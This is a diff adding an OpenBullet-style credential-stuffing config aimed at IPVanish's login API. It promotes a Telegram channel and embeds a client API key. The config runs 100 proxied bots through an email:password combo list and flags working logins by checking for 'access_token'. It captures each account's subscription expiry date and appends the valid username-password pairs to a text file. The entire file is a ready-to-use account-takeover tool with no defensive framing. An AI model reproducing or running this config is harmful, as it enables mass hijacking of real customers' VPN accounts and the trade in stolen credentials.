@@ -1,0 +1,62 @@
+[SETTINGS]
+{
+  "Name": "IPVanish",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-11-17T04:43:45.4174484-08:00",
+  "AdditionalInfo": "Telegram Channel : T.me/ghoulblack",
+  "RequiredPlugins": [],
+  "Author": "👑LilTOBA👑",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://account.ipvanish.com/api/v3/login" 
+  CONTENT "{\"api_key\":\"15cb936e6d19cd7db1d6f94b96017541\",\"client\":\"Android-3.4.2.4.52178b52178\",\"os\":\"22\",\"password\":\"<PASS>\",\"username\":\"<USER>\",\"uuid\":\"<uuid>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "X-Client: ipvanish" 
+  HEADER "X-Client-Version: 1.2." 
+  HEADER "X-Platform: Android" 
+  HEADER "X-Platform-Version: 22" 
+  HEADER "Host: account.ipvanish.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "User-Agent: okhttp/3.12.0" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "email" 
+    KEY "access_token" 
+  KEYCHAIN Failure OR 
+    KEY "The username or password provided is incorrect" 
+
+PARSE "<SOURCE>" JSON "sub_end_epoch" -> VAR "expire" 
+
+#Expiry_Date FUNCTION UnixTimeToDate "yyyy-MM-dd:HH-mm-ss" "<expire>" -> CAP "Expiry Date" 
+
+UTILITY File "ipvanish.txt" AppendLines "<USER>: <PASS> //\\n =============================" 
+
